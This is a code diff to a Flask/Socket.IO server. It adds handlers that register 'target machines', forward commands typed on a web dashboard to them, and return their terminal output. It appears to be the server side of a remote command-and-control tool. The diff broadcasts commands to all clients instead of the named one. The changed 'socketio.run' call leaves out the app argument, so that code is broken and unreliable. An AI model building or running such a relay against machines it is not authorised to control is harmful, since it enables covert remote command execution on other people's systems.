@@ -188,6 +188,35 @@ def get_output(mailbox_id):
         return jsonify({"output": row[0]})
     else:
         return jsonify({"output": "Waiting for machine execution..."})
+        
+@socketio.on('register_client')
+def handle_register(data):
+    """Fires when the python script listener connects"""
+    mailbox_id = data.get('mailbox_id')
+    print(f"Target machine [{mailbox_id}] successfully connected via WebSocket.")
+
+@socketio.on('send_command')
+def handle_send_command(data):
+    """Fires when you click submit on your web dashboard"""
+    command_text = data.get('cmd')
+    mailbox_id = data.get('mailbox_id')
+    
+    print(f"Sending command '{command_text}' to mailbox {mailbox_id}")
+    
+    # Broadcast the command instantly to the listening machine
+    emit('new_command', {'command': command_text}, broadcast=True)
+
+@socketio.on('command_output')
+def handle_command_output(data):
+    """Fires when the target machine sends back its terminal output"""
+    mailbox_id = data.get('mailbox_id')
+    output_text = data.get('output')
+    
+    print(f"Received output from {mailbox_id}")
+    
+    # Send the output instantly to your frontend JavaScript dashboard
+    emit('update_output', {'mailbox_id': mailbox_id, 'output': output_text}, broadcast=True)
+
 
 if __name__ == "__main__":
     # Fixed: db_url is now safely checked because it's defined at the top
@@ -198,4 +227,4 @@ if __name__ == "__main__":
         print("[!] No DATABASE_URL found. Skipping database initialization for local testing.")
         
     port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    socketio.run(host="0.0.0.0", port=port)
